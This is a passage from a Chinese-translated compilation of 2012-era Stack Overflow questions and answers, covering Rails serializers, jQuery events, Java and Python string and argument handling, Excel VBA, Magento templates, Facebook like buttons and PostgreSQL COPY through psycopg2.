  attributes :id, :subject, :stage
end 
```

在这种情况下，我没有收到任何错误，但是以`subject`错误的方式序列化了 - 不使用`SubjectSerializer`.

我的问题：

1.  我不应该能够在序列化程序中使用belongs_to 关系吗？
2.  如果没有 - 我怎样才能获得想要的行为 - 使用 SubjectSerializer 嵌入主题树？

* * *

## 回答 #1

> 赞同：42
> 
> 时间：2012-10-29T20:09:41.183

这不是很优雅，但它似乎正在工作：

```
class UserCombinationSerializer < ActiveModel::Serializer
  attributes :id, :stage_id, :subject_id

  has_one :subject
end 
```

*我真的不喜欢调用 has_one 而它实际上是一个 belongs_to 关联：/*

编辑：忽略我对 has_one/belongs_to 歧义的评论，文档实际上很清楚：[http ://www.rubydoc.info/github/rails-api/active_model_serializers/frames](http://www.rubydoc.info/github/rails-api/active_model_serializers/frames)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2017-11-12T20:08:54.373

在 Active Model Serializer 0-10-stable 中，`belongs_to`现在可用。

```
belongs_to :author, serializer: AuthorPreviewSerializer
belongs_to :author, key: :writer
belongs_to :post
belongs_to :blog
def blog
  Blog.new(id: 999, name: 'Custom blog')
end 
```

[https://github.com/rails-api/active_model_serializers/blob/0-10-stable/docs/general/serializers.md#belongs_to](https://github.com/rails-api/active_model_serializers/blob/0-10-stable/docs/general/serializers.md#belongs_to)

所以你可以这样做：

```
class UserCombinationSerializer < ActiveModel::Serializer
  attributes :id
  belongs_to :stage, serializer: StageSerializer
  belongs_to :subject, serializer: SubjectSerializer
end 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2016-01-11T22:08:18.997

如果你尝试这样的事情怎么办：

```
class UserCombinationSerializer < ActiveModel::Serializer
  attributes :subject,
             :stage,
             :id

  def subject
    SubjectSerializer.new(object.subject, { root: false } )
  end

  def stage
    StageSerializer.new(object.stage, { root: false } )
  end
end 
```

# jquery - JQuery - 将切换悬停与on结合起来

> ID：13125215
> 
> 赞同：2
> 
> 时间：2012-10-29T16:00:27.660
> 
> 标签：jquery

如何将切换悬停与事件结合起来？编码：

```
img.on('hover', function(){
            name = $(this).attr('title');
            function(){
              $(this).parent().append('<figcaption>' + name);
            },
            function(){
              $(this).find('figcaption').remove();
            }
          }); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:06:03.343

您必须将其拆分为`mouseenter`and `mouseleave`：

```
img.on('mouseenter', function() {
    name = $(this).attr('title');
    $(this).parent().append('<figcaption>' + name);
}).on('mouseleave', function() {
    $(this).find('figcaption').remove();
}); 
```

这就是`hover`包装成单个函数的内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:15:33.140

你没有关闭`figcaption`元素，你只是附加了一些带有起始元素和一些文本的随机字符串，而是将它创建为一个 jQuery 对象。此外，figcaption 元素被附加到`this`父元素，这将使其成为兄弟元素而不是子元素，因此`find`在里面`this`找不到它，您要么必须寻找兄弟元素，要么在父元素中搜索（应该是一个数字元素）：

```
img.on({
    mouseenter: function() {
        var name = $(this).attr('title'),
            figcaption = $('<figcaption />', {text: name});
        $(this).parent().append(figcaption);
    },
    mouseleave: function() {
        $(this).parent().find('figcaption').remove();
    }
}); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-10-29T16:05:27.293

`.on()`只能有一个回调函数。因此，您必须同时指定两者`.on('mouseenter', ...)`并`.on('mouseleave', ...)`使用 .on() 来模仿 .hover() 行为。

# java - 验证具有最少数字字符数的数组

> ID：13125217
> 
> 赞同：4
> 
> 时间：2012-10-29T16:00:31.963
> 
> 标签：java

我有一个字符串数组：

```
void populateStringArray()
{
toppings = new String[20];

toppings[0] = "Cheese12";
toppings[1] = "Pepperoni1234";
toppings[2] = "Black Olives1";
// ... 
```

我想返回数字字符最少的那个。

有人可以提出实现这一目标的逻辑吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:11:05.393

如果使用[Guava](http://code.google.com/p/guava-libraries/)是一个选项，你可以这样做：

```
int digitChars = CharMatcher.DIGIT.countIn(yourString) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-29T16:12:06.163

`str`您可以计算字符串中的位数

```
str.length() - str.replaceAll("\\d", "").length() 
```

像馅饼一样简单。

现在你所要做的就是遍历你的数组并找到最小`toppings`的字符串`s`。`str.length() - str.replaceAll("\\d", "").length()`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-29T16:03:12.073

您可以遍历字符并用于[`Character.isDigit()`](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/Character.html#isDigit%28char%29)计算字符串中的数字。

```
 String str = "Cheese12";
    int count = 0;
    for (int i = 0; i < str.length(); i++) {
        if (Character.isDigit(str.charAt(i))) {
            count++;
        }
    }
    System.out.println(count); 
```

输出：

```
2 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-29T16:20:27.040

```
Pattern p = Pattern.compile("-?\\d+"); //regex pattern to find integers on a string
int index = 0;
int test;
int lowest = Integer.MAX_VALUE;
for (int i : toppings.size()-1){
    Matcher m = p.matcher(toppings[i]);
    if (m.find()) { //assuming only one number to find
      test = Integer.parseInt(m.group());
      if (test < lowest){
          lowest = test;
          index = i;
      }
    }
}
return patterns[index]; //in case of tie the lowest index wins 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-29T16:08:59.487

```
String leastChar(){

        int leastChar=Integer.MAX_VALUE;
        String leastTopping=null;

        int eachToppingTemp=0;

        for (String topping:toppings){

            if (topping==null) continue;

            eachToppingTemp= Integer.MAX_VALUE;
            for (char eachChar:topping.toCharArray()){
                if (Character.isDigit(eachChar)){
                    eachToppingTemp++;
                }
            }

            if (eachToppingTemp<leastChar){
                leastChar=eachToppingTemp;
                leastTopping=topping;
            }

        }

        System.out.println("Lowest char topping : "+leastTopping);
        return leastTopping;
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-10-29T16:15:32.113

您可以使用正则表达式查找字符串中的所有数字并计算位数：

```
public int getNumberOfDigitsInString(String input) {
  Pattern pattern = Pattern.compile("\\d+");
  Matcher matcher = pattern.matcher(input);
  int count = 0;
  while (matcher.find()) 
    count += matcher.group().length();
  return count;
} 
```

现在您可以遍历您的数组并找到具有最少位数的数组：

```
int lowestN = Integer.MAX_VALUE;
String finalString = "";
for (String str:toppings) {
  int currentN = getNumberOfDigitsInString(str);
  if (lowestN > currentN) {
    finalStr = str;
    lowestN = currentN;
  }
}
System.out.println("Result: " + finalStr + " (has " + lowestN + " digits in it)"); 
```

# python - python函数中任意数量的参数

> ID：13125218
> 
> 赞同：22
> 
> 时间：2012-10-29T16:00:38.447
> 
> 标签：python

我想学习如何在python函数中传递任意数量的args，所以我以递归方式编写了一个简单的sum函数，如下所示：

```
def mySum(*args):
  if len(args) == 1:
    return args[0]
  else:
    return args[-1] + mySum(args[:-1]) 
```

但是当我测试时`mySum(3, 4)`，我得到了这个错误：

```
TypeError: unsupported operand type(s) for +: 'int' and 'tuple' 
```

有没有人对此有想法并给出一些纠正它的线索？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-10-29T16:05:46.513

这一行：

```
return args[-1] + mySum(args[:-1]) 
```

`args[:-1]`返回参数元组的一部分。我假设您的目标是使用该参数片段递归调用您的函数。不幸的是，您当前的代码只是使用单个对象（切片本身）调用您的函数。

相反，您要做的是在展开这些参数的情况下进行调用。

```
return args[-1] + mySum(*args[:-1])
                        ^---- note the asterisk 
```

这种技术称为“[解包参数列表](http://docs.python.org/2/tutorial/controlflow.html#unpacking-argument-lists)”，星号有时（非正式地）称为“splat”运算符。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-29T16:08:34.793

如果您不想递归地执行此操作：

```
def mySum(*args):
    sum = 0
    for i in args:
        sum = sum + i
    return sum 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-29T16:05:07.227

`args[:-1]`是一个元组，所以嵌套调用实际上是`mySum((4,))`，并且嵌套返回`args[0]`返回一个元组。因此，您最终将最后一行简化为`return 3 + (4,)`. 要解决此问题，您需要在调用 mySum 时通过将最后一行更改为`return args[-1] + mySum(*args[:-1])`.

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-29T16:05:11.070

在您的代码中，`args[:-1]`是一个元组，因此`mySum(args[:-1])`被调用`args`为一个*包含*另一个元组作为第一个参数的元组。但是，您想调用扩展为参数的函数`mySum`，`args[:-1]`您可以使用

```
mySum(*args[:-1]) 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-05-10T18:29:26.963

任意参数作为元组（带有一个星号*）传递给函数，（您可以将其更改为代码中所示的列表）并通过使用 for 循环自己编写代码来计算其元素的总和；如果不想使用 python 的 sum() 方法。

```
def summing(*arg):
    li = list(*arg)
    x = 0
    for i in range((len(li)-1)):
        x = li[i]+x

    return x

#creating a list and pass it as arbitrary argument to the function
#to colculate the sum of it's elements

li = [4, 5 ,3, 24, 6, 67, 1]
print summing(li) 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-12-03T01:51:52.377

选项1：

```
def mySum(*args):
    return sum(args)

mySum(1,2,3) # 6
mySum(1,2) # 3 
```

选项 2：

```
mySum2 = lambda *args: sum(args)
mySum2(1,2,3) # 6
mySum2(1,2) # 3 
```

# data-structures - 填充数据集时如何在winform中显示带有进度计算的进度条？

> ID：13125222
> 
> 赞同：1
> 
> 时间：2012-10-29T16:00:47.690
> 
> 标签：data-structures, progress-bar, winforms-interop

这是我的代码，我想在 datagridview 中填充数据集和导入数据时加载进度条。请帮助我

私人无效btnLoad_Click（对象发送者，EventArgs e）{

```
 string str="select Cert_ID,Card_Number,Name,DOB,Mobile,Gender,Relation ";
        str = str + " from dbo.beneficiary";

        SqlConnection conn = null;

        SqlDataAdapter sqlda = null;

        DataSet res = new DataSet();
        DataTable dt = new DataTable();
        try
        {
            _connectionString = "xyz.........";
            conn = new SqlConnection(_connectionString);
            conn.Open();
            SqlCommand command = new SqlCommand(str, conn);

            sqlda = new SqlDataAdapter(command);

            sqlda.Fill(res);

            dataGridView1.DataSource=res.Tables[0];

        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.ToString());
        }

        finally
        {
            conn.Close();
        }

    } 
```

# javascript - Javascript Regex 获取 2 个字符和之间的所有字符

> ID：13125224
> 
> 赞同：0
> 
> 时间：2012-10-29T16:01:07.900
> 
> 标签：javascript, regex

我对正则表达式有一个非常基本的了解，并且发现这很难实现。

有一个 html select 有很多这样的选项

```
<select>
  <option value="%001% 25cm Single" label="%001% 25cm Single">%001% 25cm Single</option>
  <option value="%002% 25cm Single" label="%002% 25cm Single">%002% 25cm Single</option>
  <option value="%003% 25cm Single" label="%003% 25cm Single">%003% 25cm Single</option>
</select> 
```

%001%、%002% 等将用于订购选项，开盘 % 和闭盘 % 以及它们之间的内容也需要从前端隐藏。但是，在完成上述任何操作之前，需要使用正则表达式获取 %xxx%。

因此，似乎需要匹配以 % 开头的字符串的每个选项的第一次出现，然后是任意 3 位数字，然后是另一个 %。% 之间的数字是订购时需要返回的数字

还需要一个正则表达式规则来匹配并返回 % 和 3 之间的数字，以便可以使用 jquery 从前端隐藏它们。

到目前为止我有

```
/^%.{3}%/ 
```

所有帮助表示赞赏

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:20:45.293

通常，要查找直到另一个停止字符之前的所有字符，您可以使用以下任一方法：

```
/[^%]+/ // One or more characters which are not a % character
/.+?%/  // One or more non-newline characters, as few as possible, up to a % 
```

因此，要查找 a`%`之后的任何内容直到 next `%`，您可以使用：

```
/%[^%]+%/
/%.+?%/ 
```

但是，如果您知道必须始终恰好是三个数字字符，那么您应该使用该（更具限制性的）正则表达式：

```
/%\d{3}%/ 
```

如果您想保留匹配的任何部分以供单独参考，请将其括在括号中使其成为“捕获”。每个捕获将作为返回的数组的一个单独部分出现`String.prototype.match`：

```
var marker = /%(\d{3})%/;
var string = "%001% 25cm Single";
var results = string.match(marker);
var number  = results && results[1]; // "001" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T16:11:32.310

获得 %123% 零件使用：`%[\d]{3}%`

# python - 如何加载 txt 并计算小时数？

> ID：13125226
> 
> 赞同：-1
> 
> 时间：2012-10-29T16:01:14.283
> 
> 标签：python

如何从txt文件返回小时总和？

txt内容：

```
Willy,10,37,40,20,30
Georgy,30,30,29.5,5
Addi, 20,20,20
Lisy,16,16,20 
```

在不导入任何库的情况下可以得到这样的结果吗？结果：

```
Willy:137
Georgy:94.5
Addi:60
Lisy:52 
```

# 更新

我希望能够按名称汇总小时数，即：给定以下数据（注意两次出现`Willy`，我应该获得与上述相同的结果：

```
Willy,10,37,20
Georgy,30,30,29.5,5
Addi, 20,20,20
Lisy,16,16,20
Willy,40,30 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-29T16:09:32.493

像这样的东西：

```
>>> with open("data2.txt") as f: 
...     for line in f:           #traverse over each line
...         spl=line.split(",")  #split the line at ","
                             #so now spl[0] is the name and spl[1:] are the hours 
...         print "{0}:{1}".format(spl[0],sum(map(float,spl[1:])))

         #sum(map(float,spl[1:])) returns the sum of hours after converting them to floats 
```

**输出：**

```
Willy:137.0
Georgy:94.5
Addi:60.0
Lisy:52.0 
```

**编辑：**对于您更新的问题：使用`OrderedDict()`：

```
from collections import OrderedDict as od
with open("data2.txt") as f:
    dic=od()
    for line in f:
        spl=line.split(",")
        name,summ=spl[0],sum(float(x) for x in spl[1:])
        dic.setdefault(spl[0],[]).append(summ)
    for x,y in dic.items():
        print"{0}:{1}".format(x,sum(y)) 
```

**输出：**

```
Willy:137.0
Georgy:94.5
Addi:60.0
Lisy:52.0 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-29T16:19:26.013

## 每行总和

另一个略有不同的版本，没有花哨的进口或`map`.
只是`split`，`float`和一个列表理解。

```
with open('data.txt') as f:
    for l in f:
        name,hours = l.split(',',1)
        print '%s:%s' % (name, sum([float(x) for x in hours.split(',')])) 
```

输出更新问题中的数据：

```
Willy:67.0
Georgy:94.5
Addi:60.0
Lisy:52.0
Willy:70.0 
```

## 每人总和

如果这不是您要查找的内容（您想对具有相同名称的多行求和），您可以尝试以下基于字典的方法：

```
with open('data.txt') as f:
    d = {}
    for l in f:
        name,hours = l.split(',',1)
        if name in d:
            d[name] = d[name] +  int(sum([float(x) for x in hours.split(',')]))
        else:
            d[name] = int(sum([float(x) for x in hours.split(',')]))
for n in d:
    print '%s:%s' % (n, d[n]) 
```

如您所见，这结合了 Willy 的两行代码：

```
Willy:137.0
Georgy:94.5
Addi:60.0
Lisy:52.0 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T16:06:57.807

如果您设置在该输出上，我会使用`str.split`and `sum`with `ast.literal_eval`：

```
import ast
with open('txt') as f:
    for line in f:
        name,data = line.split(',',1)
        print '{0}:{1}'.format(name,sum(ast.literal_eval(data))) 
```

在这里，我在第一个逗号处将字符串拆分为 2 个字符串，然后用于`ast.literal_eval`将右侧的字符串转换为数字元组。你也可以做

```
sum(float(x) for x in data.split(',')) 
```

代替：

```
sum(ast.literal_eval(data)) 
```

但这总是会给你一个浮点结果（即使所有输入数字都是整数）——尽管我敢打赌没有的解决方案`ast.literal_eval`会执行得更快......

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-29T16:09:23.767

这是我的解决方案：

```
import csv

with open('input.txt', 'rb') as f:
    for line in csv.reader(f):
        print ':'.join((line[0], str(sum([float(e) for e in line[1:]])))) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-29T16:50:25.787

使用 defaultdict 来累积给定名称的所有小时数的示例，然后对其进行迭代以显示总小时数。（你当然可以在旅途中总结，而不是建立列表，但知道确切的时间可能会在以后有用吗？）

```
import csv
from collections import defaultdict

name_hours = defaultdict(list)

with open('somefile') as fin:
    for row in csv.reader(fin):
        name, hours = row[0], row[1:]
        row[name].extend(map(int, hours))

print name_hours

for name, hours in name_hours.iteritems():
    print name, sum(hours) 
```

# excel - Excel：Pivot 的数据处理 - 从单列提取到多列

> ID：13125230
> 
> 赞同：1
> 
> 时间：2012-10-29T16:01:30.163
> 
> 标签：excel, excel-formula, vba

我有一个需要格式化以进行处理的值列表，并且数据的格式不适合其当前形式。

这些值当前采用以下格式：

[![](../Images/bc9a8b5b47aca7b4a7195691ba439214.png "由 imgur.com 主办")](https://imgur.com/PAO90)

有太多记录无法手动尝试。使用公式或 VBA 自动化流程的最佳方法是什么？

编辑：C3:C4 中的值出现在工作表中的每组记录中。它们下方的单元格数量可以从 1 到 3,000 不等。

谢谢你的帮助。

编辑：蒂姆你给了我很大的帮助，我非常感谢 - 编辑后的版本由于某种原因不起作用。无论如何，我对它进行了非常基本的修改，以循环并清空我不想标记的单元格值。再次感谢。

```
Sub Tester()

Const STATUS_FLAG As String = "status code:*"

Dim v1, v2
Dim c As Range
Dim sht As Worksheet

    Set sht = ActiveSheet
    Application.ScreenUpdating = False
    For Each c In sht.Range(sht.Range("C1"), sht.Cells(Rows.Count, 3).End(xlUp))
        If c.Value Like STATUS_FLAG Then
            v1 = c.Offset(-2, 0)
            v2 = c.Offset(-1, 0)
        ElseIf c.Value Like "http:*" Then
            c.Offset(0, -2).Value = v1
            c.Offset(0, -1).Value = v2
        End If
        If c.Value Like STATUS_FLAG Then
            c.Offset(-2, -2).Value = ""
            c.Offset(-2, -1).Value = ""
            c.Offset(-1, -2).Value = ""
            c.Offset(-1, -1).Value = ""
        End If
    Next c
    Application.ScreenUpdating = True

End Sub 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:49:10.800

编辑：不要填写“源”路径（v1，v2）旁边

```
Sub Tester()

Const STATUS_FLAG As String = "Status code:*"

Dim v1, v2
Dim c As Range
Dim sht As Worksheet

    Set sht = ActiveSheet
    Application.ScreenUpdating = False
    For Each c In sht.Range(sht.Range("C1"), sht.Cells(Rows.Count, 3).End(xlUp))
        If Len(c.Value)=0 Then
            'reset on blank row
            v1=""
            v2=""
        ElseIf c.Value Like STATUS_FLAG Then
            v1 = c.Offset(-2, 0)
            v2 = c.Offset(-1, 0)
        ElseIf c.Value Like "http:*" and Len(v1)>0 Then
            c.Offset(0, -2).Value = v1
            c.Offset(0, -1).Value = v2
        End If
    Next c
    Application.ScreenUpdating = True

End Sub 
```

# php - 仅在联系页面侧边栏上显示某些信息

> ID：13125232
> 
> 赞同：1
> 
> 时间：2012-10-29T16:01:43.850
> 
> 标签：php, magento, if-statement

我更熟悉 WordPress，但是我正在安装 Magento，我只想在联系页面侧边栏上显示某些信息。

我在`left.phtml`并且知道通常的 WordPress`if is_page('contacts')`不起作用。

我得到了这个代码，但它不起作用：

```
<?php if ( $_SERVER['REQUEST_URI'] == "/contacts" ) { ?> 
```

有没有人有这方面的经验？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:27:50.737

最好在 contacts.xml 中使用此代码段，而不是将条件硬编码到模板中：

```
<contacts_index_index translate="label">
...
<reference name="right">
    <block type="cms/block" name="customblockname">
        <action method="setBlockId"><block_id>cms_block_name</block_id></action>
    </block>
</reference>
</contacts_index_index> 
```

在这种情况下，我在右侧边栏中插入了一个 cms 块，但您可以使用自己的模板文件。见[这里](http://www.magentocommerce.com/design_guide/articles/intro-to-layouts)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T16:13:18.093

正如您在问题中所述，您的代码正在运行，但以 magento 方式交谈，可以在您的情况下使用以下代码。

```
if (Mage::getSingleton('cms/page')->getIdentifier() == 'contacts')
{
  echo "This is contact page.";
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-29T16:42:16.700

尝试这个

```
if(Mage::getBlockSingleton('cms/page')->getPage()->getIdentifier() == 'contacts'){
    echo "This is contact page.";
} 
```

# wordpress - Facebook 赞按钮未正确显示

> ID：13125235
> 
> 赞同：1
> 
> 时间：2012-10-29T16:01:50.693
> 
> 标签：wordpress, facebook-like

我的目标是在 url 中使用 php 变量来使用动态 Facebook 按钮。我想我首先尝试插入一个类似静态的按钮来测试它，但我遇到了一些问题。当我第一次加载页面时，插入FB代码后，点赞按钮正确显示。虽然，每次之后它只显示一个白色框，类似按钮内容的大小，闪烁，然后消失。

我的情况可能很独特，因为这*是*一个 wordpress 网站，但我不使用任何 wordpress 功能，例如 post loop 或任何设计布局功能。我只是使用 wordpress 发布帖子，这些帖子被转发到我自己的数据库，然后用我自己的代码显示它们。

在我的 index.php之后`<?php get_header(); ?>`，我放了：

```
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_GB/all.js#xfbml=1&appId=293105884122762";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script> 
```

然后在我放置的网站上的一个随机位置：

```
<fb:like href="mysite.com" send="false" layout="button_count" width="450" show_faces="true"></fb:like> 
```

我知道我需要为 IE 添加 XML 命名空间，但我认为还没有必要。

如果有人有任何建议，我将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:09:42.327

在您的喜欢按钮所在的页面上包含以下代码行：

```
<script>
    if (typeof(FB) != 'undefined' && FB != null ) {
          FB.XFBML.parse();
    }
</script> 
```

希望能帮助到你。这解决了我非常相似的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-29T17:32:31.073

Facebook 代码只是内联运行，因此如果它不包含在页面底部，则必须调用`FB.XFBML.parse()`以重新解析页面 HTML 以查找`<fb:/>`标签。另一种选择是将此 javascript 放在页面底部，或者更好地使用您的钩子将`functions.php`其包含在`wp_footer`.

```
<?php
// this function will output the facebook javascript code
function add_facebook_javascript(){ ?>
    <div id="fb-root"></div>
    <script>(function(d, s, id) {
      var js, fjs = d.getElementsByTagName(s)[0];
      if (d.getElementById(id)) return;
      js = d.createElement(s); js.id = id;
      js.src = "//connect.facebook.net/en_GB/all.js#xfbml=1&appId=293105884122762";
      fjs.parentNode.insertBefore(js, fjs);
    }(document, 'script', 'facebook-jssdk'));
    </script>
<?php
}
// this will hook your function to the "wp_footer" action
add_action('wp_header', 'add_facebook_javascript');
?> 
```

# postgresql - SQLAlchemy、Psycopg2 和 Postgresql 复制

> ID：13125236
> 
> 赞同：22
> 
> 时间：2012-10-29T16:01:52.850
> 
> 标签：postgresql, sqlalchemy, psycopg2

看起来 Psycopg 有一个用于执行[COPY](http://www.postgresql.org/docs/current/static/sql-copy.html)的自定义命令：

[psycopg2 COPY 使用 cursor.copy_from() 冻结大输入](https://stackoverflow.com/questions/3491864/)

有没有办法从 SQLAlchemy 访问这个功能？

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2014-02-27T16:33:52.363

接受的答案是正确的，但如果您想要的不仅仅是 EoghanM 的评论，那么在将表格复制到 CSV 时，以下内容对我有用...

```
from sqlalchemy import sessionmaker, create_engine

eng = create_engine("postgresql://user:pwd@host:5432/db")
ses = sessionmaker(bind=engine)

dbcopy_f = open('/tmp/some_table_copy.csv','wb')

copy_sql = 'COPY some_table TO STDOUT WITH CSV HEADER'

fake_conn = eng.raw_connection()
fake_cur = fake_conn.cursor()
fake_cur.copy_expert(copy_sql, dbcopy_f) 
```

不是必需的`sessionmaker`，但如果您习惯同时创建引擎和会话以使用`raw_connection`，则需要将它们分开（除非有某种方法可以通过会话对象访问引擎，而我没有'不知道）。提供给的 sql 字符串`copy_expert`也不是唯一的方法，有一个基本`copy_to`函数可以与可以传递给普通`COPY`TO 查询的参数子集一起使用。该命令的整体性能对我来说似乎很快，复制出约 20000 行的表。

[http://initd.org/psycopg/docs/cursor.html#cursor.copy_to](http://initd.org/psycopg/docs/cursor.html#cursor.copy_to) [http://docs.sqlalchemy.org/en/latest/core/connections.html#sqlalchemy.engine.Engine.raw_connection](http://docs.sqlalchemy.org/en/latest/core/connections.html#sqlalchemy.engine.Engine.raw_connection)

* * *

## 回答 #2

> 赞同：25
> 
> 时间：2014-06-17T15:28:39.690

如果您的引擎配置有 psycopg2 连接字符串（这是默认值，因此`"postgresql://..."`or 或`"postgresql+psycopg2://..."`），您可以使用 SQL Alchemy 会话创建 psycopg2 游标

```
cursor = session.connection().connection.cursor() 
```

您可以使用它来执行

```
cursor.copy_from(...) 
```

光标将在与您当前会话相同的事务中处于活动状态。如果 a `commit`or`rollback`发生，任何进一步使用 throw a 的游标`psycopg2.InterfaceError`，您都必须创建一个新的。

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2017-05-25T13:19:45.747

您可以使用：

```
def to_sql(engine, df, table, if_exists='fail', sep='\t', encoding='utf8'):
    # Create Table
    df[:0].to_sql(table, engine, if_exists=if_exists)

    # Prepare data
    output = cStringIO.StringIO()
    df.to_csv(output, sep=sep, header=False, encoding=encoding)
    output.seek(0)

    # Insert data
    connection = engine.raw_connection()
    cursor = connection.cursor()
    cursor.copy_from(output, table, sep=sep, null='')
    connection.commit()
    cursor.close() 
```

我在 5 秒而不是 4 分钟内插入 200000 行

* * *

## 回答 #4

> 赞同：12
> 
> 时间：2012-10-29T16:10:50.120

[看起来不像](https://groups.google.com/forum/?fromgroups=#!topic/sqlalchemy/vZIztYaqlpo)。

您可能只需要使用 psycopg2 来公开此功能并放弃 ORM 功能。我想我并没有真正看到 ORM 在这样的操作中的好处，因为它是直接的批量插入，并且处理单个对象（例如 ORM）并没有真正的意义。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2017-12-21T02:24:07.620

如果您从 SQLAlchemy 开始，您需要首先访问连接引擎（也可以通过`bind`某些 SQLAlchemy 对象上的属性名称来了解）：

```
engine = create_engine('postgresql+psycopg2://myuser:password@localhost/mydb')
# or 
engine = session.engine
# or any other way you know to get to the engine 
```

从引擎中，您可以隔离 psycopg2 连接：

```
# get a psycopg2 connection
connection = engine.connect().connection

# get a cursor on that connection
cursor = connection.cursor() 
```

以下是用于 COPY 语句的一些模板，这是一个比此处指示`cursor.copy_expert()`的更完整和更灵活的选项： [https](https://www.psycopg.org/docs/cursor.html#cursor.copy_expert) ://www.psycopg.org/docs/cursor.html#cursor.copy_expert 。`copy_from()``copy_to()`

```
# to dump to a file
dump_to = """
COPY mytable 
TO STDOUT
WITH (
    FORMAT CSV,
    DELIMITER ',',
    HEADER
);
"""

# to copy from a file:
copy_from = """
COPY mytable 
FROM STDIN
WITH (
    FORMAT CSV,
    DELIMITER ',',
    HEADER
);
""" 
```

查看上述选项的含义以及您的特定情况可能感兴趣的其他选项[https://www.postgresql.org/docs/current/static/sql-copy.html](https://www.postgresql.org/docs/current/static/sql-copy.html)。

重要说明： 的文档链接`cursor.copy_expert()`指示使用 STDOUT 写入文件并使用 STDIN 从文件复制。但是如果您查看 PostgreSQL 手册中的语法，您会注意到您也可以直接在 COPY 语句中指定要写入或写入的文件。`cursor.copy_expert()`不要那样做，如果您不是以 root 身份运行（谁在开发过程中以 root 身份运行 Python？） ，您可能只是在浪费时间应该没问题。

```
# running the copy statement
with open('/path/to/your/data/file.csv') as f:
     cursor.copy_expert(copy_from, file=f)

# don't forget to commit the changes.
connection.commit() 
```

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2015-12-19T20:27:06.160

您不需要下拉到 psycopg2，使用 raw_connection 或游标。

像往常一样执行sql，你甚至可以使用绑定参数[`text()`](http://docs.sqlalchemy.org/en/latest/core/sqlelement.html#sqlalchemy.sql.expression.text)：

```
engine.execute(text('''copy some_table from :csv
                       delimiter ',' csv'''
                   ).execution_options(autocommit=True),
               csv='/tmp/a.csv') 
```

`execution_options(autocommit=True)`如果[此 PR](https://bitbucket.org/zzzeek/sqlalchemy/pull-requests/68/)将被接受，您可以放弃

# php - Magento - 侧边栏类别过滤器，URL 不是从根目录开始

> ID：13125238
> 
> 赞同：1
> 
> 时间：2012-10-29T16:01:53.853
> 
> 标签：php, magento, magento-1.7

我的商店中有一个包含单个子类别的根类别。它被设置为一个锚点，以便在我的左侧栏中启用动态属性过滤器进行导航。

虽然过滤器渲染得很好，并且在主页上可以完美地工作，但当我导航到 CMS 页面（或除主页以外的任何页面）时，URL 不正确，例如

从主页：

[http://www.domain.com/category_name.html?price=10-20](http://www.domain.com/category_name.html?price=10-20)

从联系我们页面：

[http://www.domain.com/contacts/category_name.html?price=10-20](http://www.domain.com/contacts/category_name.html?price=10-20)

如您所见，它使用 CMS 页面 URL 作为基本路径。

过滤器 URL 没有设置。

我正在使用以下代码来显示过滤器侧边栏导航：

```
<?php if($this->canShowBlock()): ?>
<div class="product-range">
    <h2><?php echo $this->__('Browse Products') ?></h2>
    <?php echo $this->getStateHtml() ?>
    <?php if($this->canShowOptions()): ?>
            <?php $_filters = $this->getFilters() ?>
            <?php foreach ($_filters as $_filter): ?>
                <?php if($_filter->getItemsCount()): ?>
            <nav>
                <dl>
                    <dt><?php echo $this->__('Browse by '.$_filter->getName()); ?></dt>
                    <dd>
                        <?php echo str_replace(array('?','/?'), array('tapes.html?','/tapes.html?'), $_filter->getHtml()) ?>
                    </dd>
                </dl>
            </nav>
                <?php endif; ?>
            <?php endforeach; ?>
    <?php endif; ?>
</div>
<?php endif; ?> 
```

“tapes.html”是类别 URL（我只有一个类别，这很好用！）

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-10-29T21:23:38.480

您可能应该对两个替换都使用斜杠，如下所示：

```
<?php 

echo str_replace(array('?','/?'), 
                 array('/tapes.html?','/tapes.html?'), 
                 $_filter->getHtml()) 

?> 
```

# php - ffmpeg gd 支持已禁用

> ID：13125244
> 
> 赞同：1
> 
> 时间：2012-10-29T16:02:22.340
> 
> 标签：php, video, ffmpeg, gd

